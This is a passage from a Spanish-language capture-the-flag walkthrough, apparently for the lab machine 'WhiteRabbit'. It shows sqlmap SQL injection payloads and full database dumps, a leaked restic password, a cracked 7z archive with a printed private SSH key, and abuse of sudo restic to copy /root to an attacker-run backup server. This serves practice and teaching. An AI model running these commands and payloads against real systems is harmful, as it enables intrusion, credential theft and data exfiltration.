    Payload: {"campaign_id":1,"email":"" AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(2217=2217,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KLiA","message":"Clicked Link"}
---
[07:08:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:08:25] [INFO] fetched data logged to text files under '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 07:08:25 /2025-09-29/
```

Esperando un rato veremos que ha funcionado y obtendremos el `payload` que ha funcionado para la inyeccion con estas vulnerabilidades:

```
MySQL RLIKE boolean-based blind
MySQL >= 5.0 AND error-based (FLOOR)
UNION injectable con 2 columnas
```

Ahora vamos a enumerar las `DDBBs` que haya:

```shell
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  -p email \
  --proxy="http://127.0.0.1:8888" \
  --batch \
  --dbs
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:09:13 /2025-09-29/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:09:13] [INFO] resuming back-end DBMS 'mysql' 
[07:09:13] [INFO] testing connection to the target URL
[07:09:13] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (5978=5978) THEN '' ELSE 0x28 END))-- QtzV","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(2217=2217,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KLiA","message":"Clicked Link"}
---
[07:09:13] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:09:13] [INFO] fetching database names
[07:09:13] [WARNING] reflective value(s) found and filtering out
[07:09:13] [INFO] retrieved: 'information_schema'
[07:09:14] [INFO] retrieved: 'phishing'
[07:09:14] [INFO] retrieved: 'temp'
available databases [3]:
[*] information_schema
[*] phishing
[*] temp

[07:09:14] [INFO] fetched data logged to text files under '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 07:09:14 /2025-09-29/
```

Vemos que nos saca algunas interesantes, por lo que vamos a explorar la de `phishing` y la de `temp` a ver que vemos.

## Escalate user bob

### DDBB phishing

```shell
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  -p email \
  --proxy="http://127.0.0.1:8888" \
  --batch \
  -D phishing \
  --tables
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . [)]     | .'| . |                                                                                                                                    
|___|_  [']_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:13:33 /2025-09-29/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:13:33] [INFO] resuming back-end DBMS 'mysql' 
[07:13:33] [INFO] testing connection to the target URL
[07:13:33] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (5978=5978) THEN '' ELSE 0x28 END))-- QtzV","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(2217=2217,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KLiA","message":"Clicked Link"}
---
[07:13:33] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:13:33] [INFO] fetching tables for database: 'phishing'
[07:13:34] [WARNING] reflective value(s) found and filtering out
[07:13:34] [INFO] retrieved: 'victims'
Database: phishing
[1 table]
+---------+
| victims |
+---------+

[07:13:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 07:13:34 /2025-09-29/
```

Obtenemos la tabla `victims`, vamos a ver que informacion tiene:

```shell
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  -p email \
  --proxy="http://127.0.0.1:8888" \
  --batch \
  -D phishing \
  -T victims \
  --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:15:30 /2025-09-29/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:15:30] [INFO] resuming back-end DBMS 'mysql' 
[07:15:30] [INFO] testing connection to the target URL
[07:15:30] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (5978=5978) THEN '' ELSE 0x28 END))-- QtzV","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(2217=2217,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KLiA","message":"Clicked Link"}
---
[07:15:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:15:30] [INFO] fetching columns for table 'victims' in database 'phishing'
[07:15:30] [WARNING] reflective value(s) found and filtering out
[07:15:30] [INFO] retrieved: 'email'
[07:15:30] [INFO] retrieved: 'varchar(255)'
[07:15:31] [INFO] retrieved: 'phishing_score'
[07:15:31] [INFO] retrieved: 'int(11)'
[07:15:31] [INFO] fetching entries for table 'victims' in database 'phishing'
[07:15:32] [INFO] retrieved: 'test1@example.com'
[07:15:32] [INFO] retrieved: '20'
[07:15:32] [INFO] retrieved: 'test10@example.com'
[07:15:32] [INFO] retrieved: '100'
[07:15:32] [INFO] retrieved: 'test11@example.com'
[07:15:33] [INFO] retrieved: '110'
[07:15:33] [INFO] retrieved: 'test12@example.com'
[07:15:33] [INFO] retrieved: '120'
[07:15:33] [INFO] retrieved: 'test13@example.com'
[07:15:33] [INFO] retrieved: '130'
[07:15:33] [INFO] retrieved: 'test14@example.com'
[07:15:34] [INFO] retrieved: '140'
[07:15:34] [INFO] retrieved: 'test15@example.com'
[07:15:34] [INFO] retrieved: '150'
[07:15:34] [INFO] retrieved: 'test16@example.com'
[07:15:34] [INFO] retrieved: '160'
[07:15:34] [INFO] retrieved: 'test17@example.com'
[07:15:34] [INFO] retrieved: '170'
[07:15:35] [INFO] retrieved: 'test18@example.com'
[07:15:35] [INFO] retrieved: '180'
[07:15:35] [INFO] retrieved: 'test19@example.com'
[07:15:35] [INFO] retrieved: '190'
[07:15:35] [INFO] retrieved: 'test2@example.com'
[07:15:35] [INFO] retrieved: '20'
[07:15:35] [INFO] retrieved: 'test20@example.com'
[07:15:35] [INFO] retrieved: '200'
[07:15:36] [INFO] retrieved: 'test21@example.com'
[07:15:36] [INFO] retrieved: '210'
[07:15:36] [INFO] retrieved: 'test22@example.com'
[07:15:36] [INFO] retrieved: '220'
[07:15:36] [INFO] retrieved: 'test23@example.com'
[07:15:36] [INFO] retrieved: '230'
[07:15:37] [INFO] retrieved: 'test24@example.com'
[07:15:37] [INFO] retrieved: '240'
[07:15:37] [INFO] retrieved: 'test25@example.com'
[07:15:37] [INFO] retrieved: '250'
[07:15:37] [INFO] retrieved: 'test26@example.com'
[07:15:37] [INFO] retrieved: '260'
[07:15:37] [INFO] retrieved: 'test27@example.com'
[07:15:38] [INFO] retrieved: '270'
[07:15:38] [INFO] retrieved: 'test28@example.com'
[07:15:38] [INFO] retrieved: '280'
[07:15:38] [INFO] retrieved: 'test29@example.com'
[07:15:38] [INFO] retrieved: '290'
[07:15:38] [INFO] retrieved: 'test3@example.com'
[07:15:38] [INFO] retrieved: '30'
[07:15:38] [INFO] retrieved: 'test30@example.com'
[07:15:39] [INFO] retrieved: '300'
[07:15:39] [INFO] retrieved: 'test4@example.com'
[07:15:39] [INFO] retrieved: '40'
[07:15:39] [INFO] retrieved: 'test5@example.com'
[07:15:39] [INFO] retrieved: '50'
[07:15:39] [INFO] retrieved: 'test6@example.com'
[07:15:39] [INFO] retrieved: '8270'
[07:15:39] [INFO] retrieved: 'test7@example.com'
[07:15:40] [INFO] retrieved: '70'
[07:15:40] [INFO] retrieved: 'test8@example.com'
[07:15:40] [INFO] retrieved: '80'
[07:15:40] [INFO] retrieved: 'test9@example.com'
[07:15:40] [INFO] retrieved: '90'
Database: phishing
Table: victims
[30 entries]
+--------------------+----------------+
| email              | phishing_score |
+--------------------+----------------+
| test1@example.com  | 20             |
| test10@example.com | 100            |
| test11@example.com | 110            |
| test12@example.com | 120            |
| test13@example.com | 130            |
| test14@example.com | 140            |
| test15@example.com | 150            |
| test16@example.com | 160            |
| test17@example.com | 170            |
| test18@example.com | 180            |
| test19@example.com | 190            |
| test2@example.com  | 20             |
| test20@example.com | 200            |
| test21@example.com | 210            |
| test22@example.com | 220            |
| test23@example.com | 230            |
| test24@example.com | 240            |
| test25@example.com | 250            |
| test26@example.com | 260            |
| test27@example.com | 270            |
| test28@example.com | 280            |
| test29@example.com | 290            |
| test3@example.com  | 30             |
| test30@example.com | 300            |
| test4@example.com  | 40             |
| test5@example.com  | 50             |
| test6@example.com  | 8270           |
| test7@example.com  | 70             |
| test8@example.com  | 80             |
| test9@example.com  | 90             |
+--------------------+----------------+

[07:15:40] [INFO] table 'phishing.victims' dumped to CSV file '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb/dump/phishing/victims.csv'
[07:15:40] [INFO] fetched data logged to text files under '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 07:15:40 /2025-09-29/
```

Veremos varios correos de victimas, pero nada interesante por aqui.

### DDBB temp

```shell
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  -p email \
  --proxy="http://127.0.0.1:8888" \
  --batch \
  -D temp \
  --tables
```

Info:

```
       ___
       __H__                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:14:17 /2025-09-29/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:14:17] [INFO] resuming back-end DBMS 'mysql' 
[07:14:17] [INFO] testing connection to the target URL
[07:14:18] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (5978=5978) THEN '' ELSE 0x28 END))-- QtzV","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(2217=2217,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KLiA","message":"Clicked Link"}
---
[07:14:18] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:14:18] [INFO] fetching tables for database: 'temp'
[07:14:18] [WARNING] reflective value(s) found and filtering out
[07:14:18] [INFO] retrieved: 'command_log'
Database: temp
[1 table]
+-------------+
| command_log |
+-------------+

[07:14:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 07:14:18 /2025-09-29/
```

Veremos que tiene la tabla `command_log`, vamos a ver que informacion contiene.

```shell
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  -p email \
  --proxy="http://127.0.0.1:8888" \
  --batch \
  -D temp \
  -T command_log \
  --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . [.]     | .'| . |                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:16:24 /2025-09-29/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:16:24] [INFO] resuming back-end DBMS 'mysql' 
[07:16:24] [INFO] testing connection to the target URL
[07:16:25] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (5978=5978) THEN '' ELSE 0x28 END))-- QtzV","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(2217=2217,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KLiA","message":"Clicked Link"}
---
[07:16:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:16:25] [INFO] fetching columns for table 'command_log' in database 'temp'
[07:16:25] [WARNING] reflective value(s) found and filtering out
[07:16:25] [INFO] retrieved: 'id'
[07:16:25] [INFO] retrieved: 'int(11)'
[07:16:25] [INFO] retrieved: 'command'
[07:16:25] [INFO] retrieved: 'varchar(255)'
[07:16:25] [INFO] retrieved: 'date'
[07:16:26] [INFO] retrieved: 'timestamp'
[07:16:26] [INFO] fetching entries for table 'command_log' in database 'temp'
[07:16:26] [INFO] retrieved: '2024-08-30 10:44:01'
[07:16:26] [INFO] retrieved: 'uname -a'
[07:16:26] [INFO] retrieved: '1'
[07:16:26] [INFO] retrieved: '2024-08-30 11:58:05'
[07:16:27] [INFO] retrieved: 'restic init --repo rest:http://75951e6ff.whiterabbit.htb'
[07:16:27] [INFO] retrieved: '2'
[07:16:27] [INFO] retrieved: '2024-08-30 11:58:36'
[07:16:27] [INFO] retrieved: 'echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd'
[07:16:27] [INFO] retrieved: '3'
[07:16:27] [INFO] retrieved: '2024-08-30 11:59:02'
[07:16:27] [INFO] retrieved: 'rm -rf .bash_history '
[07:16:28] [INFO] retrieved: '4'
[07:16:28] [INFO] retrieved: '2024-08-30 11:59:47'
[07:16:28] [INFO] retrieved: '#thatwasclose'
[07:16:28] [INFO] retrieved: '5'
[07:16:28] [INFO] retrieved: '2024-08-30 14:40:42'
[07:16:28] [INFO] retrieved: 'cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd'
[07:16:29] [INFO] retrieved: '6'
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+

[07:16:29] [INFO] table 'temp.command_log' dumped to CSV file '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb/dump/temp/command_log.csv'
[07:16:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/28efa8f7df.whiterabbit.htb'

[*] ending @ 07:16:29 /2025-09-29/
```

Aqui ya vemos cosas mas interesantes, en concreto esta informacion es muy interesante:

```
restic init --repo rest:http://75951e6ff.whiterabbit.htb
echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
```

Veremos que esta utilizando una herramienta llamada `restic` que se puede utilizar tambien para obtener `backups` a nivel de sistema de archivos creando un `endpoint` en tu maquina atacante para que realice la conexion y obtener dicho `backup`, pero tambien estamos viendo la contraseña del repo creado en `restic`, pero sobre todo un `subdominio` el cual vamos añadir a nuestro `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb 75951e6ff.whiterabbit.htb
```

Ahora si lo guardamos y entramos en dicho `subdominio`...

```
URL = http://75951e6ff.whiterabbit.htb/
```

Info:

```
Method Not Allowed
```

Tambien estamos viendo que tenemos a un usuario llamado `neo`, por lo que teniendo toda esta informacion podremos probar a realizar lo siguiente, sabiendo que tenemos unas credenciales hacia dicho servidor de `restic` podremos listar los `backups` que tiene dentro.

```shell
sudo apt install restic
# Configurar repositorio restic
export RESTIC_PASSWORD="ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw"
export RESTIC_REPOSITORY="rest:http://75951e6ff.whiterabbit.htb"
# Listar snapshots disponibles
restic snapshots
```

Info:

```
repository 5b26a938 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

Veremos que ha funcionado, tiene un `backup` del `ssh` del usuario `bob`, por lo que se ve de forma aparente, vamos a descargarnoslo de esta forma:

```shell
mkdir -p restic_restore
restic restore 272cacd5 --target restic_restore/
```

Info:

```
repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to restic_restore/
Summary: Restored 5 files/dirs (572 B) in 0:00
```

Ahora si nos vamos a la ruta de `ssh` veremos lo siguiente:

```shell
cd restic_restore/dev/shm/bob/ssh
ls -la
```

Info:

```
total 12
drwxr-xr-x 2 root root 4096 Mar  6  2025 .
drwxr-xr-x 3 root root 4096 Mar  6  2025 ..
-rw-r--r-- 1 root root  572 Mar  6  2025 bob.7z
```

Vemos que tenemos un comprimido, si lo descomprimimos de esta forma:

```shell
7z x bob.7z
```

Info:

```
7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
```

Veremos que nos pide una `password`, vamos a probar a `crackear` la contraseña del `comprimido`.

```shell
7z2john bob.7z > hash
john --wordlist=<WORDLIST> hash # Con john the ripper
hashcat -m 11600 hash <WORDLIST> # Con Hashcat (OPCIONAL)
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q2w3e4r5t6y     (bob.7z)     
1g 0:00:02:21 DONE (2025-09-29 07:34) 0.007081g/s 168.8p/s 168.8c/s 168.8C/s 231086..150390
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, ahora vamos a probar dicha contraseña con el comprimido.

```shell
7z x bob.7z
```

Metemos como contraseña `1q2w3e4r5t6y`...

```
7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Files: 3
Size:       557
Compressed: 572
```

Veremos que ahora si lo descomprimio de forma correcta, vemos `3` archivos, que son los siguientes:

> bob

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

> bob.pub

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy
```

> config

```
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

Vemos varias cosas interesantes, vamos a probar esa clave `PEM` en el puerto `2222` del `SSH` con el usuario `bob` a ver si funciona.

### SSH Docker (bob)

```shell
chmod 600 bob
ssh -i bob bob@whiterabbit.htb -p 2222
```

Info:

```
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
bob@ebdce80611e9:~$ whoami
bob
```

Con esto veremos que estaremos dentro, pero si vemos el `hostname`:

```
ebdce80611e9
```

Vemos que estamos en un `docker` no estamos en la maquina real, por lo que vamos a investigar como escalar a la maquina real.

## Escalate user morpheus (Maquina real)

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

Vemos que podemos ejecutar el binario `restic` como el usuario `root`, por lo que vamos a probar a lanzar un servidor de `restic` en nuestra maquina atacante y pasarnos el directorio de `root` entero a nuestra maquina del repo creado del atacante.

> Maquina atacante

Vamos a establecer un `endpoint` como servidor en nuestra maquina con `restic`.

```shell
apt install golang-go
go install github.com/restic/rest-server/cmd/rest-server@latest
export PATH=$PATH:$(go env GOPATH)/bin
rest-server --path restic-repos --no-auth --listen :6666
```

Info:

```
Data directory: restic-repos
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:6666
```

Echo esto vamos a crear nuestro repositorio de esta forma:

```shell
mkdir restic-repos
chmod 777 restic-repos
cd restic-repos
restic init -r "rest:http://<IP_ATTACKER>:6666/test"
```

Info:

```
enter password for new repository: 
enter password again: 
created restic repository 0c3774e918 at rest:http://10.10.14.52:6666/test/

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Establecemos una contraseña para el repositorio llamado `test` y echo eso estaria creado ya, ahora desde la maquina victima haremos esto.

> Maquina victima

```shell
sudo restic backup -r "rest:http://<IP_ATTACKER>:6666/test" "/root/"
```

Metemos como contraseña la que establecimos en el repositorio `test`...

```
enter password for repository: 
repository 0c3774e9 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files
[0:00]          0 index files loaded

Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.604 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot 04337982 saved
```

Veremos que se volco en nuestro repo atacante de forma correcta, ahora en la maquina atacante haremos esto:

> Maquina atacante

Comprobamos que se haya pasado bien:

```shell
restic -r "rest:http://<IP_ATTACKER>:6666/test" snapshots
```

Info:

```
enter password for repository: 
repository 0c3774e9 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------
04337982  2025-09-29 07:46:30  ebdce80611e9              /root
--------------------------------------------------------------
1 snapshots
```

Ahora vamos a exportarlo a la carpeta `/tmp` de esta forma:

```shell
restic -r "rest:http://<IP_ATTACKER>:6666/test" restore 04337982 --include /root --target /tmp
```

Info:

```
enter password for repository: 
repository 0c3774e9 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 04337982 of [/root] at 2025-09-29 11:46:30.337490339 +0000 UTC by root@ebdce80611e9 to /tmp
Summary: Restored 8 files/dirs (3.865 KiB) in 0:00
```

Con esto veremos que ha funcionado y si nos movemos a dicha carpeta veremos lo siguiente:

```shell
cd /tmp/root
ls -la
```

Info:

```
total 16
drwx------  4 root root  180 Sep 29 07:46 .
drwxrwxrwt 22 root root  500 Sep 29 07:47 ..
lrwxrwxrwx  1 root root    9 Mar 24  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root   40 Sep 29 07:46 .cache
